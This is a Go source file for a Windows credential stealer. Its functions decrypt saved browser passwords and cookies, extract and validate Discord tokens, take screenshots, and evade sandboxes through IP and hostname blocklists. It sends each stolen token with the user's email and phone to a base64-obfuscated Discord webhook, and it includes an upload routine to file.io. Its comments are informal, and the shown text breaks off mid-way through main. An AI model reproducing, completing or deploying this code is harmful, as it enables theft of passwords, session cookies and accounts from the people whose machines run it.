package main

/*
#cgo CFLAGS: -IC:/Users/Aarne/Desktop/ProcjectMuskeli/minhook/include
#cgo LDFLAGS: -LC:/Users/Aarne/Desktop/ProcjectMuskeli/minhook/build/MinGW -lMinHook
#cgo LDFLAGS: -lntdll
#include "lib.h"
#include "MinHook.h"
*/
import "C"

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"

	"encoding/json"
	"fmt"
	"io"

	"image/png"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"

	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/kbinani/screenshot"

	_ "github.com/mattn/go-sqlite3"

	_ "modernc.org/sqlite"
)

var (
	WorkDir = os.Getenv("APPDATA") + "\\WinDeviceDebug"
)

func WriteToFile(FileName, content string) {
	filePath := FileName

	// Open the file in append mode (os.O_APPEND), or create it if it doesn't exist (os.O_CREATE)
	// Also set write-only permissions (os.O_WRONLY) with appropriate file permissions.
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close() // Ensure the file is closed after writing

	// Write the content to the file
	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error writing to file:", err)
	} else {
		fmt.Println("Content written to file:", FileName)
	}
}

func ParentCreateDir() {
	err := os.Mkdir(WorkDir, os.ModePerm) // os.ModePerm sets permissions for the new directory
	if err != nil {
		fmt.Println("Error creating directory:", err)
	} else {
		fmt.Println("Directory created:", WorkDir)
	}
}
func CreateDir(DirName string) {
	err := os.Mkdir(WorkDir+"\\"+DirName, os.ModePerm) // os.ModePerm sets permissions for the new directory
	if err != nil {
		fmt.Println("Error creating directory:", err)
	} else {
		fmt.Println("Directory created:", DirName)
	}
}

func CreateFile(FileName string) {
	file, err := os.Create(WorkDir + "\\" + FileName)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close() // Ensure the file is closed after creation
	fmt.Println("File created:", FileName)
}

func dec(dsavdsavdsahrwetuihruehiwthewfwerhvfhvirhwqehrhwgefgyhvwre string) string {

	huifdasifidsauhi := strings.ReplaceAll(dsavdsavdsahrwetuihruehiwthewfwerhvfhvirhwqehrhwgefgyhvwre, "~", "")
	decodedBytes, err := base64.StdEncoding.DecodeString(huifdasifidsauhi)
	if err != nil {
		//////fmt.println("Error decoding:", err)
		return "" // Return an empty string if decoding fails
	}
	return string(decodedBytes) // Return the decoded string
}

var (
	k_c int
	p_c int
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procShowWindow       = user32.NewProc("ShowWindow")
	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
)

var (
	WebH00ker = "aH~~~~R0~~~~~cHM~~~~~~~~6Ly~~~~~~9kaXNjb3Jk~~~~~~~~~~~~~~LmNvbS9hcGkvd2Vi~~~~~~~~~~~aG9va3MvM~~~~~~~~~~~~~TI5NTcyNzE0ODAx~~~~~~~~~~~~~~~~OTA5MzUzN~~~~~~~~~~~~~~~C9jcTRkek83~~~~~~~~~~~~~~OWZYNGVyc29CeG9TLS1OVlVPNlhuSVZ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~0Tlo3MVBOTHZma0VPNmoxaXdpZlFEaFRJanFFZ3JsN3ExbXAxVw=="
)

func r_s(length int) string {
	const c_s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	r_b := make([]byte, length)
	for i := range r_b {
		r_b[i] = c_s[rand.Intn(len(c_s))]
	}
	return string(r_b)
}

func dafsfdsgsdwq(webhookURL, filePath string) error {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("could not open file: %w", err)
	}
	defer file.Close()

	// Create a buffer to hold the multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Create the file part
	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
	if err != nil {
		return fmt.Errorf("could not create form file: %w", err)
	}

	// Copy the file data into the file part
	if _, err := io.Copy(part, file); err != nil {
		return fmt.Errorf("could not copy file data: %w", err)
	}

	// Close the writer to finalize the multipart form data
	if err := writer.Close(); err != nil {
		return fmt.Errorf("could not close writer: %w", err)
	}

	// Create the HTTP request
	req, err := http.NewRequest("POST", webhookURL, &requestBody)
	if err != nil {
		return fmt.Errorf("could not create request: %w", err)
	}

	// Set the content type to multipart/form-data
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("could not send request: %w", err)
	}
	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}
	return nil
}

func iiasdfdsaf32324123() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, iface := range interfaces {

		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}

		mac := iface.HardwareAddr.String()
		if mac != "" {
			return mac, nil
		}
	}

	return "", fmt.Errorf("failed to find MAC address")
}

var _k_k = ""

type s_vv struct {
	Status string `json:"status"`
	Data   struct {
		Server string `json:"server"`
	} `json:"data"`
}

type u_rs struct {
	Status string `json:"status"`
	Data   struct {
		DownloadPage string `json:"downloadPage"`
	} `json:"data"`
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	masterKey []byte
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func liikutafilu(originalPath, destinationPath string) error {

	_, fileName := filepath.Split(originalPath)

	destinationFilePath := filepath.Join(destinationPath, fileName)

	err := os.Rename(originalPath, destinationFilePath)
	if err != nil {
		return err
	}

	return nil
}

type Rsp_UPonse struct {
	Status    int    `json:"status"`
	URL       string `json:"link"`
	ExpiresIn string `json:"expires"` // Change this to string since it's a timestamp
}

func UppaaFilu(filePath string) (*Rsp_UPonse, error) {
	// file.io API URL for uploading files
	reu89gherw89grehw := dec("aH~~~~~~~R0cHM6~~~~~~~~~Ly9~~~~~~~~maWxl~~~~~~~~~~~Lm~~~~~~~~~lv")

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("error opening file: %v", err)
	}
	defer file.Close()

	// Create a buffer to store the multipart form data
	var buffer bytes.Buffer
	writer := multipart.NewWriter(&buffer)

	// Add the file to the form data
	part, err := writer.CreateFormFile("file", filePath)
	if err != nil {
		return nil, fmt.Errorf("error creating form file: %v", err)
	}

	// Copy the file content into the form data
	_, err = io.Copy(part, file)
	if err != nil {
		return nil, fmt.Errorf("error copying file to form: %v", err)
	}

	// Close the writer to finalize the form data
	writer.Close()

	// Send the POST request to file.io
	response, err := http.Post(reu89gherw89grehw, writer.FormDataContentType(), &buffer)
	if err != nil {
		return nil, fmt.Errorf("error sending POST request: %v", err)
	}
	defer response.Body.Close()

	// Read the response body
	body, err := io.ReadAll(response.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response body: %v", err)
	}

	// Log the full response for debugging
	//////fmt.println("Response body:", string(body))

	// Parse the response into the Rsp_UPonse struct
	var Rsp_UP Rsp_UPonse
	err = json.Unmarshal(body, &Rsp_UP)
	if err != nil {
		return nil, fmt.Errorf("error unmarshalling response: %v", err)
	}

	// Check if the status is success
	if Rsp_UP.Status != 200 {
		return nil, fmt.Errorf("upload failed: %s", Rsp_UP.Status)
	}

	// Return the upload response
	return &Rsp_UP, nil
}

func PoistaSuojaus(data []byte) ([]byte, error) { //func decrypt()
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func CO0PY_T0_D1R(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func HommaaMasteriAvain(localStatePath string) ([]byte, error) {
	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := io.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	if err != nil {
		//////fmt.println(err)
	}
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = PoistaSuojaus([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}

type DiscordUser struct {
	ID                   string   `json:"id"`
	Username             string   `json:"username"`
	Avatar               string   `json:"avatar"`
	Discriminator        string   `json:"discriminator"`
	PublicFlags          int      `json:"public_flags"`
	PremiumType          int      `json:"premium_type"`
	Flags                int      `json:"flags"`
	Banner               string   `json:"banner"`
	AccentColor          string   `json:"accent_color"`
	GlobalName           string   `json:"global_name"`
	AvatarDecorationData string   `json:"avatar_decoration_data"`
	BannerColor          string   `json:"banner_color"`
	MFAEnabled           bool     `json:"mfa_enabled"`
	Locale               string   `json:"locale"`
	Email                string   `json:"email"`
	Verified             bool     `json:"verified"`
	Phone                string   `json:"phone"`
	NSFWAllowed          bool     `json:"nsfw_allowed"`
	LinkedUsers          []string `json:"linked_users"`
	Bio                  string   `json:"bio"`
	AuthenticatorTypes   []string `json:"authenticator_types"`
}

var checkedTokens = make(map[string]bool)

func d_c(t string) {
	if checkedTokens[t] {
		return
	}

	url := dec("aH~~~~~R0cH~~~~~~~~~M6L~~~~~~~~~y9kaXNj~~~~~~~~~~b3JkLm~~~~~~~~~NvbS9hcG~~~~~~~~~~~~~kvdjEwL3VzZXJ~~~~~~~~~zL0BtZQ==")
	client := http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//////fmt.println("Error creating request:", err)
		return
	}

	req.Header = http.Header{
		"Authorization": {t},
		"Content-Type":  {"application/json"},
	}

	//////fmt.println("Token: " + t)

	res, err := client.Do(req)
	if err != nil {
		//////fmt.println("Error making request:", err)
		return
	}
	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		////fmt.println("Error reading response body:", err)
		return
	}

	if res.StatusCode != 200 {
		//fmt.Printf("Received non-200 response: %d, body: %s\n", res.StatusCode, string(body))
		return
	}

	var user DiscordUser
	if err := json.Unmarshal(body, &user); err != nil {
		////fmt.println("Error unmarshalling response:", err)
		return
	}

	// Determine Nitro status
	var Nitro string
	switch user.PremiumType {
	case 0:
		Nitro = "None"
	case 1:
		Nitro = "Nitro Classic"
	case 2:
		Nitro = "Nitro"
	case 3:
		Nitro = "Nitro Basic"
	default:
		Nitro = "Unknown"
	}

	message := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "----Ultra31 Services----",
				"description": "New Disc0rd acc0unt f0und :)",

				"thumbnail": map[string]interface{}{
					"url": fmt.Sprintf(dec("aHR~~~~~~~~0cHM6~~~~~~~~~~Ly9jZ~~~~~~~~~~~~~G4uZGl~~~~~~~~~~~zY29yZ~~~~~~~~~GFwc~~~~~~~~~C5jb~~~~~~~~~~~20=")+"/avatars/%s/%s.png", user.ID, user.Avatar),
				},
				"fields": []map[string]interface{}{
					{"name": "T0ken", "value": "```" + t + "```"},
					{"name": "\u200B", "value": "\u200B"},
					{"name": "Email", "value": user.Email, "inline": true},
					{"name": "Phone number", "value": user.Phone, "inline": true},
					{"name": "N1tr0 status", "value": Nitro, "inline": true},
					{"name": "LocaIe", "value": user.Locale, "inline": true},
					{"name": "UserlD", "value": user.ID, "inline": true},
					{"name": "Bio", "value": "```" + user.Bio + "```", "inline": false},
				},
			},
		}}

	jsonP4Y10AD, err := json.Marshal(message)
	if err != nil {
		////fmt.println("Error marshalling message to JSON:", err)
		return
	}

	TempLink := dec(WebH00ker)

	////fmt.println("Trying to post: " + TempLink)
	resp, errHook := http.Post(TempLink, "application/json", bytes.NewBuffer(jsonP4Y10AD))
	if errHook != nil {
		////fmt.println("Error sending webhook:", errHook)
		return
	}
	defer resp.Body.Close()

	checkedTokens[t] = true
}

func D1sc0rdT0ken1(dir string, localStatePath string) {
	dirEntries, err := os.ReadDir(dir)

	re := regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)

	if err != nil {

	}

	for _, entry := range dirEntries {
		if !entry.IsDir() {
			fullPath := filepath.Join(dir, entry.Name())
			if strings.HasSuffix(entry.Name(), ".ldb") || strings.HasSuffix(entry.Name(), ".log") {
				fileContent, err := os.ReadFile(fullPath)
				if err != nil {
					continue
				}

				matches := re.FindAllString(string(fileContent), -1)

				for _, match := range matches {
					trimmedMatch := strings.TrimPrefix(match, "dQw4w9WgXcQ:")

					t_c, err := base64.StdEncoding.DecodeString(trimmedMatch)
					if err != nil {
						continue
					}

					t_s := string(t_c)

					if strings.HasPrefix(t_s, "v10") {
						t_s = strings.TrimPrefix(t_s, "v10")

						if masterKey == nil {
							mkey, err := HommaaMasteriAvain(localStatePath)
							if err != nil {
								continue
							}
							masterKey = mkey
						}

						ciphertext := []byte(t_s)
						c, err := aes.NewCipher(masterKey)
						if err != nil {

							continue
						}
						gcm, err := cipher.NewGCM(c)
						if err != nil {

							continue
						}
						nonceSize := gcm.NonceSize()
						if len(ciphertext) < nonceSize {

							continue
						}

						nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
						plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
						if err != nil {

							continue
						}

						if len(plaintext) > 0 {

							output := string(plaintext)

							d_c(output)

						}
					} else {
						t_s, err := PoistaSuojaus([]byte(t_s))
						if err != nil {

							continue
						}

						if t_s != nil && len(t_s) > 0 {

							output := string(t_s)
							d_c(output)

						}
					}

				}

			}
		}

	}
}

func KeksiVaras(dataPath string, localStatePath string, browserName string, sqlitestuff string) {
	masterKey = nil

	CreateDir("Cookies")
	CreateFile("Cookies_" + browserName + ".txt")

	if !checkFileExist(dataPath) {
		return
	}

	err := CO0PY_T0_D1R(dataPath, os.Getenv("APPDATA")+"\\UserSettings.dat")
	if err != nil {
		////////////fmt.println(err)
		return
	}

	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\UserSettings.dat")
	if err != nil {
		////fmt.println(err)
		return
	}
	defer db.Close()

	rows, err := db.Query(sqlitestuff)
	if err != nil {
		////fmt.println(err)
		return
	}
	defer rows.Close()

	for rows.Next() {
		var host_key, name, encrypted_value string
		var expires_utc int64
		err := rows.Scan(&host_key, &name, &encrypted_value, &expires_utc)
		if err != nil {
			log.Println("["+browserName+"]Error scanning row:", err)
			continue
		}

		if strings.HasPrefix(encrypted_value, "v10") || strings.HasPrefix(encrypted_value, "v20") {
			//encrypted_value = strings.TrimPrefix(encrypted_value, "v10")

			if strings.HasPrefix(encrypted_value, "v10") {
				encrypted_value = strings.TrimPrefix(encrypted_value, "v10")
			} else if strings.HasPrefix(encrypted_value, "v20") {
				encrypted_value = strings.TrimPrefix(encrypted_value, "v20")
			} else {
				fmt.Println("[" + browserName + "]   Encrypted value dosent have a prefix!!! \n\n" + encrypted_value)
			}

			if masterKey == nil {
				mkey, err := HommaaMasteriAvain(localStatePath)
				if err != nil {
					log.Println("["+browserName+"]Error getting master key:", err)
					continue
				}
				masterKey = mkey
			}

			ciphertext := []byte(encrypted_value)
			c, err := aes.NewCipher(masterKey)
			if err != nil {
				log.Println("["+browserName+"]Error creating cipher:", err)
				continue
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				log.Println("["+browserName+"]Error creating GCM:", err)
				continue
			}
			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				log.Println("[" + browserName + "]Error: ciphertext too short")
				continue
			}

			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {

				log.Println("["+browserName+"]Error decrypting value:", err)
				continue
			}

			if len(plaintext) > 0 {
				k_c = k_c + 1
				output := fmt.Sprintf("%s\tTRUE\t/\t0\t%d\t%s\t%s\n", host_key, expires_utc, name, plaintext)

				WriteToFile(WorkDir+"\\Cookies\\Cookies_"+browserName+".txt", output)
			}
		} else {
			pass, err := PoistaSuojaus([]byte(encrypted_value))
			if err != nil {
				log.Println("["+browserName+"]Value:", encrypted_value)
				log.Println("["+browserName+"]Error decrypting value:", err)
				continue
			}

			if host_key != "" && name != "" && len(pass) > 0 {
				k_c = k_c + 1
				output := fmt.Sprintf("%s\tTRUE\t/\t0\t%d\t%s\t%s\n", host_key, expires_utc, name, pass)

				WriteToFile(WorkDir+"\\Cookies\\Cookies_"+browserName+".txt", output)

			}
		}
	}

	err = rows.Err()
	if err != nil {
		//////fmt.println(err)
	}

}

func NappaaSalikset(dataPath string, localStatePath string, browser string, SQLLite string) {

	CreateDir("Passwords")
	CreateFile("Passwords_" + browser + ".txt")

	masterKey = nil

	// Check for Login Data file
	if !checkFileExist(dataPath) {
		return
	}

	// Copy Login Data file to temp location
	err := CO0PY_T0_D1R(dataPath, os.Getenv("APPDATA")+"\\Config.dat")
	if err != nil {
		return
	}

	// Connect to the SQLite database
	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\Config.dat")

	if err != nil {
		return
	}
	defer db.Close()

	// Open the database
	rows, err := db.Query(SQLLite)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		var URL, USERNAME, PASSWORD string

		// Scan the values from the row
		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
		if err != nil {

			return
		}

		// Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10") { // Means it's Chrome 80 or higher
			PASSWORD = strings.Trim(PASSWORD, "v10")

			if string(masterKey) != "" {
				ciphertext := []byte(PASSWORD)
				c, err := aes.NewCipher(masterKey)
				if err != nil {
					//////fmt.println(err)
				}
				gcm, err := cipher.NewGCM(c)
				if err != nil {
					//////fmt.println(err)
				}
				nonceSize := gcm.NonceSize()
				if len(ciphertext) < nonceSize {
					//////fmt.println(err)
				}

				nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
				plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
				if err != nil {
					//////fmt.println(err)
				}
				if string(plaintext) != "" {
					p_c = p_c + 1
					//////fmt.println(URL, " | ", USERNAME, " | ", string(plaintext))

					WriteToFile(WorkDir+"\\Passwords\\Passwords_"+browser+".txt", URL+" | "+USERNAME+" | "+string(plaintext)+"\n")
				}
			} else { // If the master key hasn't been requested yet, then get it.
				mkey, err := HommaaMasteriAvain(localStatePath)
				if err != nil {
					//////fmt.println(err)
				}
				masterKey = mkey
			}
		} else { // Means it's Chrome v. < 80
			pass, err := PoistaSuojaus([]byte(PASSWORD))
			if err != nil {
				return
			}

			if URL != "" && USERNAME != "" && string(pass) != "" {
				p_c = p_c + 1
				//file.WriteString(URL + " | " + USERNAME + " | " + string(pass) + "\n")

				WriteToFile(WorkDir+"\\Passwords\\Passwords_"+browser+".txt", URL+" | "+USERNAME+" | "+string(pass)+"\n")
				//////fmt.println(URL, USERNAME, string(pass))
			}
		}
	}

	err = rows.Err()
	if err != nil {
		return
	}

}

// Chrome shit ends

func PaskaPyorimas() bool {
	_, dlvPresent := os.LookupEnv("DLV_BIND_IP")
	return dlvPresent
}

func teePakattuKansio(dir string, ZipName string) {
	sourceDir := dir

	// Specify the name of the ZIP file to create
	zipFileName := ZipName

	// Create or open the ZIP file for writing
	zipFile, err := os.Create(zipFileName)
	if err != nil {
		fmt.Println("Error creating ZIP file:", err)
		return
	}
	defer zipFile.Close()

	// Create a new ZIP archive
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Walk through the directory and add files to the ZIP archive
	err = filepath.Walk(sourceDir, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Create a new file header for the file in the ZIP archive
		zipHeader, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// Set the name of the file in the ZIP archive to be the relative path
		// from the source directory
		zipHeader.Name, err = filepath.Rel(sourceDir, filePath)
		if err != nil {
			return err
		}

		// Add the file header to the ZIP archive
		writer, err := zipWriter.CreateHeader(zipHeader)
		if err != nil {
			return err
		}

		// If the file is a regular file, open an copy its contents to the ZIP archived
		if !info.IsDir() {
			file, err := os.Open(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}
		}

		return nil
	})

	if err != nil {
		fmt.Println("Error creating ZIP archive:", err)
		return
	}

	fmt.Println("ZIP archive created:", zipFileName)
}

type Selaimet struct {
	Keksi  string
	Avain  string
	Selain string
}

type Selaime struct {
	Salis   string
	Avaaja  string
	Selaaja string
}

type Discordit struct {
	path  string
	state string
}

func getDiskUsage(path string) (uint64, error) {
	var freeBytes, totalBytes, totalFreeBytes uint64
	drive := windows.StringToUTF16Ptr(path)

	err := windows.GetDiskFreeSpaceEx(drive, &freeBytes, &totalBytes, &totalFreeBytes)
	if err != nil {
		return 0, err
	}
	return totalBytes, nil
}

/*

func iiasdfdsaf32324() (string, error) {
	cmd := exec.Command("wmic", "cpu", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	// Process the output
	return processOutput(out.String()), nil
}

// Get GPU information
func getGPUInfo() (string, error) {
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	// Process the output
	return processOutput(out.String()), nil
}

// Get hardware ID
func hiudfuihadsfihdsaiuhf() (string, error) {
	cmd := exec.Command("wmic", "csproduct", "get", "uuid")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	return processOutput(out.String()), nil
}

func processOutput(output string) string {
	lines := strings.Split(output, "\n")
	if len(lines) > 1 {
		// Get the second line, which usually contains the actual data
		return strings.TrimSpace(lines[1])
	}
	return ""
}
*/

func Minecraft_Token(MineCraftPath string, Client_Name string) {
	if checkFileExist(MineCraftPath) {

		liikutafilu(MineCraftPath, Client_Name)

	}
}

func CleanUp() {

}

type BrowserPaths struct {
	LocalStatePath string
	CookiesPath    string
}

func TrimToGoodPath(txt string) string {
	Stage1 := strings.ReplaceAll(txt, "\\", "")
	Stage2 := strings.ReplaceAll(Stage1, "C:", "")
	return Stage2
}

func G3T1P() string {

	url := "https://api.ipify.org/?format=txt"

	// Send GET request
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("Failed to fetch URL: %v", err)
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Failed to read response body: %v", err)
	}

	return string(body)
}

func Ch3CK_ST4tU5() {

}

func main() {

	if checkFileExist(WorkDir) {
		os.RemoveAll(WorkDir)
	}

	ParentCreateDir()

	/*

		fileAuto, err := os.Open("output.txt")
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer fileAuto.Close()

		var pathsAuto []BrowserPaths

		scanner := bufio.NewScanner(fileAuto)
		for scanner.Scan() {
			line := scanner.Text()

			if strings.Contains(line, "Local State Path") || strings.Contains(line, "---") {
				continue
			}

			parts := strings.Split(line, "|")
			if len(parts) >= 3 {
				localStatePath := strings.TrimSpace(parts[1])
				cookiesPath := strings.TrimSpace(parts[2])
				pathsAuto = append(pathsAuto, BrowserPaths{LocalStatePath: localStatePath, CookiesPath: cookiesPath})
			}
		}

		// Check for errors during scanning
		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading file:", err)
		}

		// Print the paths

		SQL_LITE_DECODED_AUTO := dec("U0V~~~~~~~~~~~~~MRUNUIGhvc3Rfa2V~~~~~~~~~5LCBuYW1lLCB~~~~~~~~~~~~lbmNyeXB0ZWR~~~~~~~~~~~~fdmFsdWUsIGV~~~~~~~~~~~4cGlyZXNfdXRjIEZ~~~~~~~~~~~~~~~~ST00gY29va~~~~~~~~~~~2llcw==")

		for _, pathAuto := range pathsAuto {
			fmt.Println("Local State Path:", pathAuto.LocalStatePath)
			fmt.Println("Cookies Path:", pathAuto.CookiesPath)

			KeksiVaras(pathAuto.CookiesPath, pathAuto.LocalStatePath, TrimToGoodPath(pathAuto.CookiesPath), SQL_LITE_DECODED_AUTO)
		}

	*/

	//C.print_parent_process_name()

	//C.FindFile()

	//C.InstallHooks()

	/*success := C.AntiDebug()

	if success == C.bool(true) { // C's true
		//////fmt.println("Successfully hidden from debugger.")
	} else {
		//////fmt.println("Failed to hide from debugger.")
	}


	if os.Getenv("DEBUG") != "" {
		var p *int
		fmt.Println(*p)
	}

	path := "C:\\"
	total, err := getDiskUsage(path)
	if err != nil {

		return
	}

	const limitGB = 60
	if total < limitGB*1024*1024*1024 { // Convert 60 GB to bytes
		var p *int      // p is nil
		fmt.Println(*p) // Dereferencing nil pointer
	}

	Checker_GPU, check_err := iiasdfdsaf32324()

	if check_err != nil {
		//////fmt.println(check_err)
	}

	if Checker_GPU == "Microsoft Basic Display Adapter" {
		os.Exit(2)
	}


	// Install hooks
	//C.InstallHooks()

	//MessageBox("Homo nekke", "Hello from Golang")

	//C.RemoveHooks()

	b_l_m := []string{"george", "745773", "DESKTOP-ET51AJO", "Bruno", "00900BC83803", "00900BC83803", "00900BC83802", "00900BC83802", "LAPTOP-G6K652MP", "DESK-9ZF8KKB72B", "00900BC83803", "DESK-YK0KVG4CXI", "DESKTOP-ET51AJO", "405464", "azure-PC", "WIN-5E07COS9ALR", "Louise-PC", "DESKTOP-QSDJYRO", "JARIVE", "DESKTOP-LYMOSXJ", "John-PC", "John", "george", "DESKTOP-4X5Q5KP", "MARTHAADAM", "TIM-UYK0807UO3T", "DESK-5B7RO4CWE2", "DESKTOP-NKS5SNV", "AMAZING-AVOCADO", "Wasp", "Lisa-PC", "980108", "DESKTOP-5ZOWVWD", "DESKTOP-Q933RAV", ""}
	host, errrrrr := os.Hostname()
	for _, name := range b_l_m {

		if errrrrr != nil {
			//////fmt.println(errrrrr)
		}

		if host == name {
			var p *int      // p is nil
			fmt.Println(*p) // Dereferencing nil pointer
		}

	}

	if checkFileExist("D:\\Tools") {
		var p *int      // p is nil
		fmt.Println(*p) // Dereferencing nil pointer
	}

	if PaskaPyorimas() {
		var p *int      // p is nil
		fmt.Println(*p) // Dereferencing nil pointer
	}
	*/

	TempLink := dec(WebH00ker)

	We3__H00K := TempLink

	e_1p := G3T1P()

	v_p := string(e_1p)

	s_v := []string{"35.245.115.205", "20.99.160.173", "34.141.245.25", "194.154.78.224", "20.163.64.196", "79.104.209.182", "195.74.76.223", "194.154.78.86", "20.114.22.115", "94.217.44.80", "87.166.48.109", "185.44.176.179", "185.44.177.33", "74.125.215.161", "66.249.88.224", "74.125.210.10"}

	for _, b_s := range s_v {

		if v_p == b_s {
			os.Exit(1)
		}

	}

	//////////////fmt.println("C++ runtime installed succesfuly")
	//REAL SHIT STARTS HERE

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := fmt.Sprintf(WorkDir+"\\Screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println("Error creating file:", err)
			continue
		}

		// Encode and save the screenshot
		err = png.Encode(file, img)
		if err != nil {
			fmt.Println("Error encoding image:", err)
		}
		file.Close()

	}

	m_m := r_s(7)

	if m_m == "" {
		os.Exit(1)
	}

	h_n, error_HOST := os.Hostname()

	if error_HOST != nil {
		//////fmt.println(error_HOST)
	}

